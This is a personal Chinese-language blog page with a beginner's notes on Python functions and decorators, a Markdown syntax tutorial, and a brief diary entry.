          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2018/12/02/对装饰器的理解/">对装饰器的理解</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <p>关于python装饰器的思考： </p>
<p>我们首先应该对函数进一步了解<br>函数也可以被传递，比如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"a"</span>)</span><br><span class="line">v = a</span><br><span class="line">v()</span><br><span class="line">输出结果为：a</span><br></pre></td></tr></table></figure></p>
<p>这里我并没有加()即v = a()，因为v()此时将返回TypeError，而print(v)则由于无返回值而返回None  </p>
<hr>
<p><strong>而v = a则将函数名作为参数传递，想要运行该函数只需要v()，此时print(v)将返回v的地址。</strong><br><strong>函数内也可以声明函数，但是此函数并不能在函数外访问，如：</strong>  </p>
<p>如：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">v</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'00'</span>)</span><br><span class="line">	v()</span><br><span class="line">v()</span><br><span class="line">此时运行结果为：<span class="number">00</span></span><br><span class="line">							NameError: name <span class="string">'v'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li><strong>进一步理解函</strong>  </li>
</ul>
<h3 id="函数也是可以被返回的"><a href="#函数也是可以被返回的" class="headerlink" title="函数也是可以被返回的"></a>函数也是可以被返回的</h3><p>如果要返回函数，只需返回其函数名即可，其函数名将作为参数传递。如需调用则只需函数名加括号，在这里尤其要弄清楚传递和返回函数时该不该加括号。</p>
<p>如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'dyf'</span>)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'abc'</span>)</span><br><span class="line">	<span class="keyword">if</span> x == <span class="string">'1'</span>:</span><br><span class="line">		<span class="keyword">return</span> b</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> c</span><br><span class="line">x = input(<span class="string">'请输入'</span>)</span><br><span class="line">v = a(x)</span><br><span class="line">v()</span><br><span class="line">则输出结果为:</span><br><span class="line">	请输入 <span class="number">1</span></span><br><span class="line">	dyf</span><br><span class="line">	请输入 <span class="number">2</span></span><br><span class="line">	abc</span><br></pre></td></tr></table></figure></p>
<p><strong>注：</strong><br><strong>如果想打印函数返回值一定要用输出函数，如果print(v())输出其返回值。</strong><br>  <strong>如果print(v)则输出其地址</strong>  </p>
<p>函数内也可以定义函数，这种函数称之为内嵌函数，内嵌函数是私密的，因此不可在函数外调用，我们往<br>往将其作为返回值而进行调用。</p>
<p>return 可以返回多个值，其值可以被传递，但是应当注意，尽量不要用golbal返回值，涂添烦恼</p>
<hr>
<ul>
<li><strong>装饰器的实质</strong>  </li>
</ul>
<p>对于装饰器而言，实际上是一个函数，只不过其参数也是个函数。应当注意的是传递函数时应使用其函数名而不加括号，其函数名将作为参数而传递。  </p>
<p>语法有如下两种：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(f)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">lmt</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'abc'</span>)</span><br><span class="line">		f()</span><br><span class="line">	<span class="keyword">return</span> abc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dyf</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">'dyf'</span>)</span><br><span class="line"></span><br><span class="line">dyf()</span><br><span class="line">dyf = a(dyf)</span><br><span class="line">dyf()</span><br><span class="line">print(dyf.__name__)</span><br><span class="line">输出结果为：</span><br><span class="line">					dyf</span><br><span class="line">					abc</span><br><span class="line">					dyf</span><br><span class="line">					abc      <span class="comment">#dyf函数的名和注释文档被重写(docstring)  </span></span><br><span class="line">=============================================================================  </span><br><span class="line"><span class="number">2.</span><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(f)</span>:</span></span><br><span class="line"><span class="meta">	@wraps(f)  @这个函数保留原函数名</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">lmt</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'abc'</span>)</span><br><span class="line">		f()</span><br><span class="line">	<span class="keyword">return</span> abc</span><br><span class="line"><span class="meta">@a</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dyf</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">'dyf'</span>)</span><br><span class="line">dyf()	</span><br><span class="line">输出结果为:</span><br><span class="line">				abc</span><br><span class="line">				dyf</span><br></pre></td></tr></table></figure>
<hr>
<p>以上两种方式效果完全相同，只是@方式是其简便写法，装饰器的本质即： 以函数调用函数的方式来对被调用函数进行修饰，但要注意 在函数调用的过程中应当以函数名作为参数 在执行函数时才加括号。</p>
<p> 若要保留被装饰函数的真是名需要调用functools模块的wraps()函数，语法为 @wraps(f)，实际上wraps()函数本身就是一个装饰器，只不过其参数是一个函数罢了。</p>
<h5 id="Ps-这是我对装饰器的简单初步理解，以后会进一步补充。"><a href="#Ps-这是我对装饰器的简单初步理解，以后会进一步补充。" class="headerlink" title="Ps.这是我对装饰器的简单初步理解，以后会进一步补充。"></a>Ps.这是我对装饰器的简单初步理解，以后会进一步补充。</h5>
        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2018-12-02</span>
          
            
              <span class="post-category"><a href="/categories/tutorial/">tutorial</a></span>
            
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2018/12/02/markdown-tutorial/">markdown-tutorial</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="记录一下markdown的语法"><a href="#记录一下markdown的语法" class="headerlink" title="记录一下markdown的语法"></a>记录一下markdown的语法</h3><hr>
<ul>
<li>语义标记:</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:right">描述</th>
<th style="text-align:center">样式</th>
<th style="text-align:left">代码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">加粗</td>
<td style="text-align:center"><strong>dyf</strong></td>
<td style="text-align:left"><code>** dyf **</code></td>
</tr>
<tr>
<td style="text-align:right">斜体</td>
<td style="text-align:center"><em>dyf</em></td>
<td style="text-align:left"><code>* dyf *</code></td>
</tr>
<tr>
<td style="text-align:right">加粗斜体</td>
<td style="text-align:center"><em> <strong>dyf</strong> </em></td>
<td style="text-align:left"><code>* ** dyf ** *</code></td>
</tr>
<tr>
<td style="text-align:right">删除线</td>
<td style="text-align:center"><del>dyf</del></td>
<td style="text-align:left"><code>~~ dyf ~~</code></td>
</tr>
</tbody>
</table>
<ul>
<li>语义标签:</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:right">描述</th>
<th style="text-align:center">样式</th>
<th style="text-align:left">代码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">上标</td>
<td style="text-align:center">dyf<sup>s<sup></sup></sup></td>
<td style="text-align:left"><code>dyf&lt;sup&gt;s&lt;sup&gt;</code></td>
</tr>
<tr>
<td style="text-align:right">下标</td>
<td style="text-align:center">dyf<sub>s<sub></sub></sub></td>
<td style="text-align:left"><code>dyf&lt;sub&gt;s&lt;sub&gt;</code></td>
</tr>
<tr>
<td style="text-align:right">键盘文本</td>
<td style="text-align:center"><kbd>Ctrl<kbd></kbd></kbd></td>
<td style="text-align:left"><code>&lt;kbd&gt;Ctrl&lt;kbd&gt;</code></td>
</tr>
</tbody>
</table>
<hr>
<ul>
<li><strong>标题：</strong></li>
</ul>
<p>code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># dyf</span><br><span class="line">## dyf</span><br><span class="line">### dyf</span><br><span class="line">#### dyf </span><br><span class="line">##### dyf</span><br><span class="line">###### dyf</span><br><span class="line">####### dyf     //错误的代码</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>demo：</strong></p>
<h1 id="dyf"><a href="#dyf" class="headerlink" title="dyf"></a>dyf</h1><h2 id="dyf-1"><a href="#dyf-1" class="headerlink" title="dyf"></a>dyf</h2><h3 id="dyf-2"><a href="#dyf-2" class="headerlink" title="dyf"></a>dyf</h3><h4 id="dyf-3"><a href="#dyf-3" class="headerlink" title="dyf"></a>dyf</h4><h5 id="dyf-4"><a href="#dyf-4" class="headerlink" title="dyf"></a>dyf</h5><h6 id="dyf-5"><a href="#dyf-5" class="headerlink" title="dyf"></a>dyf</h6><hr>
<p>＃号之所以能加粗是因为markdown本质是用语法糖封装的html语言，而html只有6种title-size，所以最多加6个#号</p>
<ul>
<li><p><em>分级标题</em><br>code：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  dyf</span><br><span class="line">=========</span><br><span class="line">  Stella Del Mattino</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>Demo:</p>
<h1 id="dyf-6"><a href="#dyf-6" class="headerlink" title="dyf"></a>dyf</h1><h2 id="Stella-Del-Mattino"><a href="#Stella-Del-Mattino" class="headerlink" title="Stella Del Mattino"></a>Stella Del Mattino</h2><hr>
<ul>
<li><strong>引用：</strong></li>
</ul>
<p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;dyf</span><br><span class="line"></span><br><span class="line">&gt;&gt;is</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;really</span><br><span class="line"></span><br><span class="line">&gt;&gt;cool</span><br><span class="line"></span><br><span class="line">&gt;!     //注意每行空开</span><br></pre></td></tr></table></figure></p>
<p>Demo:</p>
<blockquote>
<p>dyf</p>
</blockquote>
<blockquote>
<blockquote>
<p>is</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>really</p>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p>cool</p>
</blockquote>
</blockquote>
<blockquote>
<p>!</p>
</blockquote>
<hr>
<ul>
<li><strong>行内标记：</strong></li>
</ul>
<p>Demo:</p>
<p>PHP是世界上<code>最好</code>的语言</p>
<p>Code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP是世界上`最好`的语言  //标记代码将变为一行</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li><strong>代码块：</strong></li>
</ul>
<p>Demo:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"dyf is really cool"</span>);</span><br></pre></td></tr></table></figure></p>
<p>Code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">` ` `C   //language</span><br><span class="line">printf(&quot;dyf is really cool&quot;);</span><br><span class="line">` ` `</span><br></pre></td></tr></table></figure></p>
<p>不同的语言可以显示不同的高亮，但与主题有关。</p>
<hr>
<ul>
<li><strong>插入链接：</strong></li>
</ul>
<p>Demo:</p>
<ol>
<li><a href="http://laravel-china.org/docs/laravel/5.5/" target="_blank" rel="noopener">lavarel toturial</a></li>
<li><a href="http://codeforces.com/" target="_blank" rel="noopener">codeforces</a></li>
</ol>
<p>Code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[lavarel torurial](http://laravel-china.org/docs/laravel/5.5/)</span><br><span class="line"></span><br><span class="line">[codeforces][1]</span><br><span class="line">[1]http://codeforces.com/   //这是引入式写法</span><br></pre></td></tr></table></figure></p>
<hr>
<ul>
<li><strong>插入图片</strong></li>
</ul>
<p>Demo：</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/%E7%A8%BB%E5%9F%8E.jpeg?raw=true" alt="稻城"></p>
<p>Code：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![稻城](https://github.com/Explainaur/dyf_Blog/blob/master/images/a.jpg?raw=true)</span><br></pre></td></tr></table></figure></p>
<p>上传照片需要图床，可用github当图床，语法格式与链接一致。</p>
<hr>
<p>到这里差不多就说完了，还有流程图和时序图没有讲，因为我的模板不兼容。</p>
<p>Ps：写道插入图片的时候我在听canon，这是世界上最好听的曲子，突然想起了和我一起去稻城亚丁的两个傻子。</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2018-12-02</span>
          
            
              <span class="post-category"><a href="/categories/life/">life</a></span>
            
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2018/12/02/my-world/">my world</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="公元-2018-10-24-1-16"><a href="#公元-2018-10-24-1-16" class="headerlink" title="公元 2018.10.24   1:16"></a>公元 2018.10.24   1:16</h3><hr>
<p><strong>从现在开始,我要记录这精彩的世界</strong>  </p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
</section>

  
  <nav class="pagination">
      <a class="extend prev" rel="prev" href="/">< Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>


        </div>
      </main>

      <footer class="footer syuanpi fadeIn" id="footer">
  <hr>
  <div class="footer-wrapper">
    <div class="left">
      <div class="contact-icon">
    
    
    
    
    
    
    
    
    
        
        
        
        
        
            <a href="https://www.facebook.com/dong.yifan.1" class="iconfont icon-social-facebook" title="facebook"></a>
        
        
        
        
    
        
        
        
            <a href="https://twitter.com/dong_yifan" class="iconfont icon-social-twitter" title="twitter"></a>
        
        
        
        
        
        
    
        
        
        
        
            <a href="https://www.zhihu.com/people/aurora-56-20/activities" class="iconfont icon-zhihu" title="zhihu"></a>
        
        
        
        
        
    
        
            <a href="https://github.com/Explainaur" class="iconfont icon-social-github" title="github"></a>
        
        
        
        
        
        
        
        
    
</div>

    </div>
    <div class="right">
      <div class="copyright">
    <div class="info">
        <span>&copy;</span>
        <span>2016 ~ 2020</span>
        <span>❤</span>
        <span>dyf</span>
    </div>
    <div class="theme">
        <span>
            Powered by
            <a href="http://hexo.io/" target="_blank">Hexo </a>
        </span>
        <span>
            Theme
            <a href="https://github.com/ColMugX/hexo-theme-Nlvi"> Nlvi </a>
        </span>
    </div>
    
</div>

    </div>
  </div>
</footer>
    </div>
  </div>
  <script src="/script/lib/jquery/jquery-3.2.1.min.js"></script>


  <script src="/script/lib/lightbox/js/lightbox.min.js"></script>








<script src="/script/src/nlvi.js"></script>

  <script src="/script/scheme/banderole.js"></script>

<script src="/script/bootstarp.js"></script>


<div class="backtop syuanpi melt toTop" id="backtop">
    <i class="iconfont icon-up"></i>
    <span style="text-align:center;font-family:Georgia;"><span style="font-family:Georgia;" id="scrollpercent">1</span>%</span>
</div>


  <div class="search" id="search">
    <div class="mask" id="mask"></div>
    <div class="search-wrapper syuanpi">
      <h2 id="search-header" class="syuanpi">Search？</h2>
      <div class="input">
        <input type="text" id="local-search-input" results="0" name>
      </div>
      <div id="local-search-result"></div>
    </div>
  </div>


</body>
</html>
